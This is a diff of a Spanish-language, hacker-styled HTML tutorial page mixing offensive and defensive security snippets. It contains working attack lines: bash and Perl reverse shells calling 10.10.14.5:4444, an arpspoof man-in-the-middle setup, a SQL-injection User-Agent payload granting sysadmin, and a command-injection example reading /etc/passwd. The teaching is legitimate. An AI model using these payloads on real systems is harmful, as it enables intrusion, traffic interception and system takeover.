@@ -12,11 +12,13 @@
     <meta property="og:type" content="website">
 
     <style>
-        /* Estilos generales */
+        /* Variables y Configuración General */
         :root {
             --bg-color: #0d0208;
             --main-color: #00ff00;
+            --highlight-color: #00ffff;
             --shadow-color: rgba(0, 255, 0, 0.7);
+            --error-color: #ff0000;
             --font-family: 'Consolas', 'Courier New', Courier, monospace;
         }
 
@@ -27,97 +29,123 @@
             margin: 0;
             padding: 0;
             overflow-x: hidden;
-            text-shadow: 0 0 1px var(--main-color); /* Efecto de brillo sutil */
+            text-shadow: 0 0 1px var(--main-color);
         }
 
-        /* Efecto de parpadeo (cursor de terminal) */
-        @keyframes blink {
-            from, to { opacity: 0 }
-            50% { opacity: 1 }
+        /* Animaciones */
+        @keyframes blink { from, to { opacity: 0 } 50% { opacity: 1 } }
+        @keyframes led-flash {
+            0%, 100% { background-color: var(--main-color); box-shadow: 0 0 5px var(--main-color); }
+            50% { background-color: transparent; box-shadow: none; }
         }
 
-        /* Estilo del Scrollbar (para navegadores Webkit) */
+        /* Scrollbar */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb {
-            background-color: #004d00;
-            border: 1px solid var(--main-color);
-        }
+        ::-webkit-scrollbar-thumb { background-color: #004d00; border: 1px solid var(--main-color); }
 
-        /* Canvas para el efecto Matrix */
+        /* Canvas (Lluvia Matrix) */
         #matrixCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            z-index: 0;
-            pointer-events: none;
-            opacity: 0.2; /* Lluvia sutil */
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: 0; pointer-events: none; opacity: 0.2;
         }
 
-        /* Contenedor principal: Simula la ventana de la terminal */
-        .container {
+        /* Layout Principal */
+        .grid-container {
+            display: grid;
+            grid-template-columns: 200px 1fr; /* Menú de 200px y Contenido flexible */
+            gap: 20px;
             width: 95%;
-            max-width: 1000px;
+            max-width: 1200px;
             margin: 10px auto;
-            padding: 15px 25px;
-            border: 1px solid var(--main-color);
-            box-shadow: 0 0 25px var(--shadow-color);
             position: relative;
             z-index: 10;
-            background-color: rgba(0, 0, 0, 0.95); /* Opacidad alta para legibilidad */
+            background-color: rgba(0, 0, 0, 0.95);
             min-height: 98vh;
+            border: 1px solid var(--main-color);
+            box-shadow: 0 0 25px var(--shadow-color);
         }
 
-        /* Sección de Cabecera (El Banner de la terminal) */
+        /* Menú de Navegación Lateral */
+        nav {
+            padding: 15px 10px;
+            border-right: 1px solid var(--highlight-color);
+            position: sticky;
+            top: 0;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+        }
+        nav h3 {
+            color: var(--highlight-color);
+            border-bottom: 1px solid var(--highlight-color);
+            margin-top: 0;
+            padding-bottom: 5px;
+            text-shadow: 0 0 3px var(--highlight-color);
+        }
+        nav ul {
+            list-style: none;
+            padding: 0;
+        }
+        nav a {
+            color: var(--main-color);
+            text-decoration: none;
+            display: block;
+            padding: 5px 0;
+            transition: color 0.1s;
+        }
+        nav a:hover {
+            color: var(--highlight-color);
+            text-decoration: underline;
+            text-shadow: 0 0 5px var(--highlight-color);
+        }
+
+        /* Contenedor Principal (Main) */
+        .content-area {
+            padding: 15px 25px;
+        }
+
+        /* Cabecera y Logo */
         header {
             text-align: left;
             border-bottom: 2px solid var(--main-color);
             padding-bottom: 10px;
             margin-bottom: 30px;
         }
-        
         #logo-ascii {
             font-size: 0.9em;
             line-height: 1.1;
-            white-space: pre; /* Mantiene el formato del ASCII Art */
+            white-space: pre;
             margin-top: 15px;
-            color: #4CAF50; /* Un verde diferente para el logo */
-            text-shadow: none;
-        }
-
-        /* Título principal con efecto de "escritura" */
-        #main-title {
-            font-size: 2.5em;
-            text-shadow: 0 0 10px var(--main-color);
-            min-height: 50px;
-            display: inline-block;
-            color: var(--main-color);
-        }
-        
-        #status-bar {
-            background-color: #ff0000;
-            color: white;
+            color: #4CAF50;
+            border: 1px dashed #004d00;
             padding: 5px;
-            display: inline-block;
-            font-weight: bold;
-            text-shadow: none;
-            box-shadow: 0 0 5px #ff0000;
-            margin-left: 20px;
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
         }
-
-        /* Prompts y Títulos */
-        h2, h3 {
-            color: #00ffff; /* Cian para comandos o prompts */
-            border-bottom: 1px dashed #00ffff;
-            padding-bottom: 5px;
-            margin-top: 40px;
-            text-shadow: 0 0 3px rgba(0, 255, 255, 0.7);
+        #main-title {
+            font-size: 2.2em;
+            text-shadow: 0 0 10px var(--main-color);
+            min-height: 40px;
+            display: inline-block;
         }
         
-        .prompt {
-            color: #ffff00; /* Amarillo para el prompt de inicio */
+        /* Status Bar con LED Parpadeante */
+        .status-led {
+            height: 10px;
+            width: 10px;
+            background-color: var(--main-color);
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+            animation: led-flash 1s infinite;
+        }
+
+        /* Prompts y Títulos de Sección */
+        h2 {
+            color: var(--highlight-color);
+            border-bottom: 1px dashed var(--highlight-color);
+            padding-bottom: 8px;
+            margin-top: 40px;
+            text-shadow: 0 0 5px var(--highlight-color);
         }
         
         .prompt::before {
@@ -125,21 +153,28 @@
             color: var(--main-color);
         }
 
-        /* Contenido y Artículos */
+        /* Artículos y Contenido */
         article {
             background-color: rgba(0, 20, 0, 0.3);
-            border-left: 3px solid #00ffff;
+            border-left: 3px solid var(--highlight-color);
             padding: 15px 20px;
             margin-bottom: 30px;
             transition: all 0.2s ease-in-out;
+            position: relative; /* Para el separador */
         }
+        article:hover { border-left-color: #ffff00; box-shadow: inset 0 0 10px rgba(255, 255, 0, 0.2); }
+        article h3 { color: #ffff00; text-shadow: 0 0 3px #ffff00; }
 
-        article:hover {
-            border-left-color: #ffff00;
-            box-shadow: inset 0 0 10px rgba(255, 255, 0, 0.2);
+        /* Separador Hacking */
+        .separator {
+            width: 100%;
+            height: 1px;
+            background: repeating-linear-gradient(to right, var(--main-color), var(--main-color) 4px, transparent 4px, transparent 8px);
+            margin: 20px 0;
+            opacity: 0.5;
         }
-
-        /* Bloques de código: Terminal Output Style */
+        
+        /* Bloques de código */
         pre {
             background-color: #000;
             color: #f0f0f0;
@@ -147,16 +182,14 @@
             padding: 15px;
             overflow-x: auto;
             font-family: var(--font-family);
-            white-space: pre-wrap;
-            word-wrap: break-word;
             box-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
         }
-
+        
         /* Imágenes */
         img {
             max-width: 100%;
             height: auto;
-            border: 2px solid #00ffff;
+            border: 2px solid var(--highlight-color);
             margin-top: 15px;
             display: block;
             margin-left: auto;
@@ -164,20 +197,18 @@
             box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
         }
 
-        /* Pie de página con las reglas */
+        /* Pie de página (Protocolo) */
         footer {
             margin-top: 50px;
-            border-top: 1px dashed #ff0000; /* Rojo para el disclaimer */
+            border-top: 1px dashed var(--error-color);
             padding-top: 20px;
             font-size: 0.85em;
             text-align: center;
             color: #aaa;
         }
-
         footer h3 {
-            color: #ff0000; 
-            border-bottom: 1px solid #ff0000;
-            margin-bottom: 15px;
+            color: var(--error-color); 
+            border-bottom: 1px solid var(--error-color);
             text-shadow: 0 0 5px rgba(255, 0, 0, 0.7);
         }
     </style>
@@ -186,11 +217,11 @@
 
     <canvas id="matrixCanvas"></canvas> 
     
-    <div class="container">
-        <header>
+    <div class="grid-container">
+        
+        <nav>
             <div id="logo-ascii">
                 [ Iniciando Codificación ]
-                
                 <pre>
                     .'.. /|
                    / |  //
@@ -201,216 +232,198 @@
                   | | |
                   \_/
                 </pre>
-                [ Status: <span id="status-bar">Online</span> ]
+                [ <span class="status-led"></span> Status: Online ]
                 <br>[ Imdustrias Lazarus ]
                 <br>[ KaliHunter32 ]
             </div>
+            <div class="separator" style="margin-top: 25px;"></div>
             
-            <h1 id="main-title" class="prompt"></h1> 
-        </header>
+            <h3>Módulos de Acceso</h3>
+            <ul>
+                <li><a href="#recursos">[ 0x01 ] Recursos en Línea</a></li>
+                <li><a href="#defensivo">[ 0x02 ] Seguridad Defensiva</a></li>
+                <li><a href="#historico">[ 0x03 ] Archivo Histórico</a></li>
+                <li><a href="#protocolo">[ 0x04 ] Protocolo</a></li>
+            </ul>
+        </nav>
 
-        <main>
-            <h2>// RECURSOS EN LÍNEA: 0x01 //</h2>
-            
-            <article>
-                <h3>[ TÉCNICA ] Enumeración de Subdominios (OSINT)</h3>
-                <p>La recolección de información pasiva es el primer paso en un pentesting. Usar herramientas como `sublist3r` o métodos de certificados SSL son cruciales. Este es un ejemplo de un comando `amass` básico.</p>
+        <div class="content-area">
+            <header>
+                <h1 id="main-title" class="prompt"></h1> 
+            </header>
+
+            <section id="recursos">
+                <h2>// 0x01 RECURSOS EN LÍNEA: Herramientas y Técnicas //</h2>
                 
-                <pre><code>
-amass enum -d dominioobjetivo.com -o /tmp/subdomains.txt
-                </code></pre>
-                <p>Este comando enumera subdominios y guarda la salida para un análisis posterior. La efectividad de esta etapa define el éxito de las fases siguientes.</p>
-                <img src="https://via.placeholder.com/600x300/004d00/00ffff?text=Diagrama+Flujo+OSINT" alt="Flujo de Recolección de Información Pasiva">
-            </article>
+                <article>
+                    <h3>[ OSINT ] Detección de Tecnologías con Wappalyzer</h3>
+                    <p>La inteligencia de fuentes abiertas (OSINT) es crucial. Antes de interactuar, necesitamos saber qué tecnologías usa el objetivo. Wappalyzer es una extensión de navegador (o herramienta CLI) que identifica frameworks, CMS, servidores, y más.</p>
+                    <pre><code>
+# Comando CLI de Wappalyzer (requiere instalación)
+wappalyzer https://target.com
+                    </code></pre>
+                </article>
 
-            <article>
-                <h3>[ DEFENSIVO ] Hardening de Servidor Apache (Archivos .htaccess)</h3>
-                <p>Fragmento de código esencial para mejorar la seguridad de un servidor web Apache. Desactiva la navegación de directorios y bloquea el acceso a archivos de configuración sensibles.</p>
-                <pre><code>
-# Deshabilitar la navegación de directorios
-Options -Indexes
+                <article>
+                    <h3>[ MAN IN THE MIDDLE ] Configuración de ARP Spoofing (Ejemplo)</h3>
+                    <p>El ataque de ARP Spoofing (`ARP Cache Poisoning`) es la base para muchos ataques 'Man in the Middle' dentro de una red local. El objetivo es engañar al router y al objetivo para que envíen todo el tráfico a la máquina del atacante.</p>
+                    <pre><code>
+# En Kali Linux, usando ettercap (GUI o CLI) o arpspoof.
 
-# Bloquear acceso a archivos sensibles
-&lt;FilesMatch "\.(htaccess|htpasswd|ini|log|inc|bak)$"&gt;
-    Require all denied
-&lt;/FilesMatch&gt;
+# Habilitar el reenvío de IP para que la red siga funcionando
+echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# Forzar HTTPS (si se usa mod_rewrite)
-RewriteEngine On
-RewriteCond %{HTTPS} off
-RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
-                </code></pre>
-            </article>
+# Comando arpspoof: engaña al target para que piense que el router es el atacante
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+                    </code></pre>
+                </article>
 
-            <article>
-                <h3>[ CÓDIGO ] Ejemplo de Cifrado AES en Python</h3>
-                <p>El cifrado simétrico AES es el estándar para la protección de datos. Aquí un snippet educativo usando la librería `cryptography` para cifrar y descifrar un mensaje.</p>
-                <pre><code>
-from cryptography.fernet import Fernet
+                <article>
+                    <h3>[ CÓDIGO ] Script para validar contraseñas seguras (Python)</h3>
+                    <p>Función educativa para validar la complejidad de una contraseña, exigiendo mayúsculas, minúsculas, números y símbolos, y una longitud mínima.</p>
+                    <pre><code>
+import re
 
-# Generar una clave para propósitos de demostración
-# Esta clave debe ser almacenada de forma segura
-key = Fernet.generate_key()
-f = Fernet(key)
+def is_strong(password):
+    if len(password) < 12:
+        return False
+    if not re.search(r"[a-z]", password):
+        return False
+    if not re.search(r"[A-Z]", password):
+        return False
+    if not re.search(r"\d", password):
+        return False
+    if not re.search(r"[$@#%&]", password): # Caracteres especiales
+        return False
+    return True
 
-message = "Datos_Clasificados_2025".encode()
-encrypted_message = f.encrypt(message)
+print(is_strong("SecurePass123#")) # True
+print(is_strong("weak")) # False
+                    </code></pre>
+                </article>
 
-print(f"Clave: {key.decode()}")
-print(f"Mensaje Cifrado: {encrypted_message.decode()}")
+                <div class="separator"></div>
 
-# Descifrar
-decrypted_message = f.decrypt(encrypted_message)
-print(f"Mensaje Descifrado: {decrypted_message.decode()}")
-                </code></pre>
-                <p>Este código es un ejemplo básico y debe ser adaptado para entornos de producción.</p>
-            </article>
+            </section>
             
-            <h2>// ARCHIVO HISTÓRICO: 0x02 //</h2>
+            <section id="defensivo">
+                <h2>// 0x02 SEGURIDAD DEFENSIVA: Mitigación y Hardening //</h2>
+                
+                <article>
+                    <h3>[ HARDENING ] Deshabilitar servicios innecesarios en Linux</h3>
+                    <p>La superficie de ataque se reduce deshabilitando los servicios que no se usan. Menos servicios = menos posibles puntos de entrada. Ejemplo con `systemctl`:</p>
+                    <pre><code>
+# Ver todos los servicios activos
+systemctl list-units --type=service --state=running
 
-            <article>
-                <h3>[ TÉCNICA ] Inyección de Comandos (CMD Injection)</h3>
-                <p>Una vulnerabilidad que permite a un atacante ejecutar comandos del sistema operativo a través de una aplicación web. El payload a menudo usa caracteres especiales como `;`, `|` o `&&`.</p>
-                <pre><code>
-# Entrada normal:
-ping -c 4 192.168.1.1
+# Deshabilitar un servicio (ej. Apache si no se usa)
+sudo systemctl stop apache2
+sudo systemctl disable apache2
 
-# Entrada con inyección:
-ping -c 4 192.168.1.1; cat /etc/passwd
-                </code></pre>
-                <p>Si la aplicación no sanitiza correctamente la entrada del usuario, el comando `cat /etc/passwd` se ejecuta en el servidor. La mitigación es usar funciones específicas del lenguaje y evitar la ejecución de comandos externos.</p>
-            </article>
-            
-            <article>
-                <h3>[ CTF ] Write-up: Resolución de Desafío Forense</h3>
-                <p>Un resumen de cómo se resolvió un desafío "Capture The Flag" (CTF) enfocado en el análisis forense de una imagen de disco. La herramienta principal fue `foremost`.</p>
-                <pre><code>
-# Comando para extraer archivos de una imagen de disco
-foremost -i disk_image.dd -o /tmp/recover_files
-                </code></pre>
-                <img src="https://via.placeholder.com/600x300/004d00/00ffff?text=Foremost+Output" alt="Resultado de la herramienta Foremost">
-            </article>
+# Si el servicio es realmente innecesario, también se puede enmascarar
+sudo systemctl mask apache2
+                    </code></pre>
+                </article>
 
-            <article>
-                <h3>[ PAYLOAD ] Shell Inversa de Netcat para Linux</h3>
-                <p>Netcat (nc) es la "navaja suiza" de las redes. Aquí está el clásico comando para establecer una conexión de shell inversa, asumiendo que el atacante (LHOST) está escuchando en el puerto 4444.</p>
-                <pre><code>
-# En la máquina víctima:
-/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+                <article>
+                    <h3>[ MITIGACIÓN ] Prevención de CSRF (Token Syncronizer)</h3>
+                    <p>Cross-Site Request Forgery (CSRF) se mitiga con tokens de sincronización únicos por sesión. El servidor genera un token y lo verifica en cada solicitud POST importante.</p>
+                    <pre><code>
+// Ejemplo conceptual en PHP (parte del formulario)
+&lt;?php
+    session_start();
+    $token = bin2hex(random_bytes(32));
+    $_SESSION['csrf_token'] = $token;
+?&gt;
 
-# En la máquina atacante (escucha):
-nc -lvnp 4444
-                </code></pre>
-                <p>Este es un concepto fundamental en la prueba de penetración para demostrar el control total de un sistema vulnerable. Solo para uso autorizado.</p>
-            </article>
-
-            <article>
-                <h3>[ HERRAMIENTA ] Uso Básico de Wireshark (Filtros)</h3>
-                <p>Wireshark es un analizador de protocolo de red. Los filtros son vitales para reducir la cantidad masiva de datos capturados. Aquí unos filtros útiles:</p>
-                <pre><code>
-# Mostrar solo tráfico HTTP y SMTP
-http or smtp
-
-# Mostrar paquetes TCP con flag SYN activado (inicio de conexión)
-tcp.flags.syn == 1 and tcp.flags.ack == 0
-
-# Filtrar por IP de origen
-ip.src == 192.168.1.10
-                </code></pre>
-            </article>
-
-            <article>
-                <h3>[ SEGURIDAD CLOUD ] Principios Básicos de S3 Bucket Security</h3>
-                <p>Un error común es dejar los buckets de Amazon S3 abiertos públicamente. El siguiente ejemplo es la política JSON que **debe evitarse** para prevenir exposición de datos.</p>
-                <pre><code>
+&lt;form method="POST" action="/cambiar-pass"&gt;
+    &lt;input type="hidden" name="csrf_token" value="&lt;?= $token ?&gt;"&gt;
+    &lt;!-- Campos del formulario --&gt;
+&lt;/form&gt;
+                    </code></pre>
+                </article>
+                
+                <article>
+                    <h3>[ CLOUD ] IAM Policy Mínimo para S3 (Principio de Menor Privilegio)</h3>
+                    <p>En seguridad Cloud, el Principio de Menor Privilegio (PoLP) es vital. Este ejemplo de política IAM solo permite la acción de lectura (`s3:GetObject`) en una carpeta específica, nada más.</p>
+                    <pre><code>
 {
+    "Version": "2012-10-17",
     "Statement": [
         {
-            "Sid": "PublicReadGetObject",
             "Effect": "Allow",
-            "Principal": "*",
-            "Action": "s3:GetObject",
-            "Resource": "arn:aws:s3:::tu-bucket-nombre/*"
+            "Action": [
+                "s3:GetObject"
+            ],
+            "Resource": [
+                "arn:aws:s3:::mi-bucket-seguro/public/*"
+            ]
         }
     ]
 }
-                </code></pre>
-                <p>**¡Advertencia!** Esta política permite la lectura pública. La configuración recomendada siempre debe restringir el `Principal` al mínimo necesario.</p>
-            </article>
+                    </code></pre>
+                </article>
 
-            <article>
-                <h3>[ SEGURIDAD DE REDES ] Bloqueo de Ping (ICMP) en Firewalld</h3>
-                <p>Un ejemplo de cómo deshabilitar las respuestas a solicitudes de ping (ICMP Echo Request) para aumentar la invisibilidad de un servidor Linux con `firewalld`.</p>
-                <pre><code>
-# Primero, comprueba el estado actual
-sudo firewall-cmd --query-icmp-block=echo-request
+                <div class="separator"></div>
+                
+            </section>
 
-# Bloquea las peticiones de ping (temporal)
-sudo firewall-cmd --add-icmp-block=echo-request
+            <section id="historico">
+                <h2>// 0x03 ARCHIVO HISTÓRICO: Explotación y Conceptos Base //</h2>
+                
+                <article>
+                    <h3>[ TÉCNICA ] Enumeración de Subdominios (OSINT)</h3>
+                    <p>La recolección de información pasiva es el primer paso en un pentesting. Usar herramientas como `sublist3r` o métodos de certificados SSL son cruciales. Este es un ejemplo de un comando `amass` básico.</p>
+                    
+                    <pre><code>
+amass enum -d dominioobjetivo.com -o /tmp/subdomains.txt
+                    </code></pre>
+                    <img src="https://via.placeholder.com/600x300/004d00/00ffff?text=Diagrama+Flujo+OSINT" alt="Flujo de Recolección de Información Pasiva">
+                </article>
 
-# Bloquea las peticiones de ping (permanente)
-sudo firewall-cmd --add-icmp-block=echo-request --permanent
+                <article>
+                    <h3>[ SHELL ] Reverse Shell de Perl (Alternativa a Bash)</h3>
+                    <p>Si Bash no está disponible o tiene restricciones, Perl es una alternativa común para obtener una shell inversa en sistemas Linux/Unix.</p>
+                    <pre><code>
+perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'
+                    </code></pre>
+                </article>
 
-# Recarga el firewall para aplicar la regla permanente
-sudo firewall-cmd --reload
-                </code></pre>
-            </article>
+                <article>
+                    <h3>[ REDES ] Escaneo de Versiones de Servicio con Nmap</h3>
+                    <p>Además de escanear puertos, Nmap puede intentar determinar la versión del software que se ejecuta en ese puerto, lo cual es vital para buscar exploits específicos. El parámetro `-sV` es para "version scan".</p>
+                    <pre><code>
+nmap -sV -p 21,22,80,443 192.168.1.100
+                    </code></pre>
+                </article>
+                
+                <article>
+                    <h3>[ WEB ] Búsqueda de Inyecciones de Código en Headers HTTP</h3>
+                    <p>No todas las vulnerabilidades están en los parámetros GET/POST. A menudo, las aplicaciones procesan los Headers HTTP (User-Agent, Referer, X-Forwarded-For) sin sanitizar, lo que puede llevar a inyecciones.</p>
+                    <pre><code>
+# Ejemplo de payload en el Header User-Agent
+User-Agent: '; EXEC sp_addsrvrolemember 'usuario', 'sysadmin' --
+                    </code></pre>
+                    <p>Esto busca una inyección SQL ciega en el backend que procese el User-Agent.</p>
+                </article>
+                
+                <div class="separator"></div>
+                </section>
 
-            <article>
-                <h3>[ CODIFICACIÓN ] Uso de Base64 para ofuscación básica</h3>
-                <p>Base64 es un sistema de codificación, no de cifrado, pero a menudo se utiliza para ofuscar (ocultar a simple vista) strings en payloads o archivos de configuración. Ejemplo en Bash:</p>
-                <pre><code>
-# Codificar:
-echo "Comando oculto" | base64
+            <section id="protocolo">
+                <footer>
+                    <h3>[ PROTOCOLO DE CONCIENCIA CYBERNÉTICA ]</h3>
+                    <p><strong>Clasificación: ALTO SECRETO // Solo para Fines Educativos //</strong></p>
+                    <p>Este repositorio digital ha sido creado para la **difusión responsable de conocimiento** en el campo de la ciberseguridad, el hacking ético y la investigación de vulnerabilidades. Los materiales aquí expuestos están diseñados para fomentar la comprensión y la protección de sistemas, no para su explotación maliciosa. **LEVIATHAM no se hace responsable.**</p>
+                    <p>Se espera que los visitantes actúen con **integridad, ética y respeto** por la ley y la propiedad digital.</p>
+                    <p>// El conocimiento es una herramienta: su impacto depende de las manos que lo empuñen //</p>
+                </footer>
+            </section>
 
-# Salida: Q29tYW5kbyBvY3VsdG8K
-
-# Decodificar:
-echo "Q29tYW5kbyBvY3VsdG8K" | base64 -d
-                </code></pre>
-            </article>
-
-            <article>
-                <h3>[ TÉCNICA ] Escaneo de Vulnerabilidades con Nessus/OpenVAS</h3>
-                <p>Una breve guía conceptual sobre cómo configurar un escaneo de vulnerabilidades utilizando una herramienta comercial (Nessus) o de código abierto (OpenVAS). Estos escaneos son el corazón de la gestión de riesgos.</p>
-                <p>El escaneo requiere definir el **objetivo**, las **credenciales** (para escaneo autenticado) y la **política** (tipo de pruebas a ejecutar). Un escaneo no autenticado solo ve lo que un atacante externo vería, mientras que uno autenticado simula lo que un atacante interno podría hacer.</p>
-                <img src="https://via.placeholder.com/600x300/004d00/00ffff?text=Nessus+Dashboard" alt="Dashboard de un escáner de vulnerabilidades">
-            </article>
-            
-            <article>
-                <h3>[ LENGUAJE C ] Función Vulnerable a Buffer Overflow (Concepto)</h3>
-                <p>La vulnerabilidad de *buffer overflow* ocurre cuando un programa escribe más datos en un bloque de memoria de lo que se asignó. Aquí un ejemplo en C del uso inseguro de `gets()`:</p>
-                <pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-
-void vulnerable_function() {
-    char buffer[10]; // Buffer de solo 10 bytes
-    printf("Introduce un string: ");
-    gets(buffer); // FUNCIÓN INSEGURA: No verifica límites.
-}
-
-int main(int argc, char **argv) {
-    vulnerable_function();
-    printf("Programa finalizado.\n");
-    return 0;
-}
-                </code></pre>
-                <p>La solución es usar funciones seguras como `fgets()` con límites definidos o lenguajes que gestionen la memoria automáticamente.</p>
-            </article>
-
-        </main>
-
-        <footer>
-            <h3>[ PROTOCOLO DE CONCIENCIA CYBERNÉTICA ]</h3>
-            <p><strong>Clasificación: ALTO SECRETO // Solo para Fines Educativos //</strong></p>
-            <p>Este repositorio digital ha sido creado para la **difusión responsable de conocimiento** en el campo de la ciberseguridad, el hacking ético y la investigación de vulnerabilidades. Los materiales aquí expuestos están diseñados para fomentar la comprensión y la protección de sistemas, no para su explotación maliciosa. **LEVIATHAM no se hace responsable.**</p>
-            <p>Se espera que los visitantes actúen con **integridad, ética y respeto** por la ley y la propiedad digital.</p>
-            <p>// El conocimiento es una herramienta: su impacto depende de las manos que lo empuñen //</p>
-        </footer>
-
+        </div>
     </div>
 
     <script src="script.js"></script>
 </body>
 </html>
+
